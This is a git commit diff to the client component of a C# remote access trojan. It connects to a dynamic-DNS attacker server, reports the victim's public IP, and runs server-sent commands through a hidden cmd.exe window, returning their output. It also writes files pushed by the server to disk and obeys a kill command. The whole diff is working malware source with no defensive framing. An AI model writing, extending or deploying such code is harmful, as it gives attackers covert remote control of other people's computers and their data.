ef84140382ff37487b2393cc91201be9654e453f
Alexander F <afehr35@outlook.com>
2017-04-23 19:33:38 +0200

    Kinda Stable

--- RAT_clientSide/Program.cs
+++ RAT_clientSide/Program.cs
@@ -1,18 +1,17 @@
 ﻿using System;
-using System.Diagnostics;
-using System.IO;
-using System.Net;
-using System.Net.NetworkInformation;
+using System.Data;
 using System.Net.Sockets;
+using System.IO;
+using System.Diagnostics;
+using System.Linq;
+using System.Net;
 
 namespace RAT_clientside
 {
     class Program
     {
         private static string HostName = "njratserver420.ddns.net";
-        private static int Port = 6258; //TODO Make system that let's the user give input by using a cmd argument or default
-
-        private static string cmd;
+        private static int Port = 6258;
 
         private static StreamReader sr;
         private static StreamWriter sw;
@@ -23,7 +22,8 @@ namespace RAT_clientside
         {
             try
             {
-                TcpClient connectedToServerTcpClient = new TcpClient(HostName,Port);
+                TcpClient connectedToServerTcpClient = new TcpClient(HostName,6258);
+                connectedToServerTcpClient.Dispose();
                 return true;
             }
             catch (Exception e)
@@ -32,69 +32,113 @@ namespace RAT_clientside
             }
         }
 
+        private static bool KeepAlive = true;
+
+        private static string cmd;
         private static string output;
 
         public static void Main(string[] args)
         {
-            while (true)
+            while (KeepAlive)
             {
                 try
                 {
-                    client = new TcpClient(HostName, Port); //Waits until it's connected
-                    sr = new StreamReader(client.GetStream());
+                    client = new TcpClient(HostName, Port);
+
                     sw = new StreamWriter(client.GetStream());
+                    sr = new StreamReader(client.GetStream());
 
-                } catch(Exception e) { }
+                    try
+                    {
+                        sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
+                        sw.Flush();
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    } //Send the ip of the client
 
-                //Send the client IP to the server
-                try
-                {
-                    sw.WriteLine(new WebClient().DownloadString(@"http://icanhazip.com").Trim());
-                    sw.Flush();
+                    while (ConnectedToServer())
+                    {
+                        try
+                        {
+                            cmd = sr.ReadLine();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                            //TODO Break the loop if ioException is thrown
+                        } //Get the Command
+
+                        if (cmd.StartsWith("E+"))
+                        {
+                            string exeCmd = cmd.Substring(2); //TODO check if 2 is the correct number
+                            Console.WriteLine("E");
+
+                            Process cmdProcess = new Process();
+                            cmdProcess.StartInfo.CreateNoWindow = true;
+                            cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                            cmdProcess.StartInfo.UseShellExecute = false;
+                            cmdProcess.StartInfo.RedirectStandardOutput = true;
+                            cmdProcess.StartInfo.FileName = "cmd.exe";
+
+                            cmdProcess.StartInfo.Arguments = "/C" + exeCmd;
+                            cmdProcess.Start();
+
+                            output = cmdProcess.StandardOutput.ReadToEnd();
+
+                            Console.WriteLine(output);
+
+                            exeCmd = string.Empty;
+                            cmd = string.Empty;
+                            //Execute command and send back output
+                        }
+
+                        if (cmd.StartsWith("S"))
+                        {
+                            string[] sendArgs = cmd.Split(Convert.ToChar("_"));
+
+                            string fileName = sendArgs[1];
+                            string dataString = sendArgs[2];
+
+                            byte[] data = dataString
+                                .Split(Convert.ToChar("+"))
+                                .Select(item => byte.Parse(item))
+                                .ToArray();
+
+                            File.WriteAllBytes(fileName, data);
+
+                            output = fileName;
+                        }
+
+                        if (cmd.StartsWith("killAll"))
+                        {
+                            Console.WriteLine("killAll");
+                            KeepAlive = false;
+                        }
+
+                        try
+                        {
+                            sw.WriteLine(output);
+                            sw.Flush();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e);
+                            throw;
+                        }
+
+                        output = string.Empty;
+
+                    }
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine(e);
-                }
+                } //Try to connect to the server
 
-                //Create the cmd process to be used in the loop
-                System.Diagnostics.Process cmdProcess = new System.Diagnostics.Process();
-
-                cmdProcess.StartInfo.FileName = "cmd.exe";
-                cmdProcess.StartInfo.CreateNoWindow = true;
-                cmdProcess.StartInfo.UseShellExecute = false;
-                cmdProcess.StartInfo.RedirectStandardOutput = true;
-                cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                
-                //Loop that's active aslong as server responds to pings
-                while (ConnectedToServer())
-                {
-                    //Wait for incoming commands
-                    try
-                    {
-                        cmd = sr.ReadLine();
-                    }
-                    catch (Exception e){}
-
-                    if (!string.IsNullOrEmpty(cmd))
-                    {
-                        cmdProcess.StartInfo.Arguments = "/C" + cmd;
-                        cmdProcess.Start();
-                        output = cmdProcess.StandardOutput.ReadToEnd();  //Get the output and store it in a string
-                        cmd = String.Empty;
-                    }
-
-                    //Send output back
-                    try
-                    {
-                        sw.WriteLine(output);
-                        sw.Flush();
-                    }
-                    catch (Exception e){}
-                }
             }
         }
-
     }
 
 }
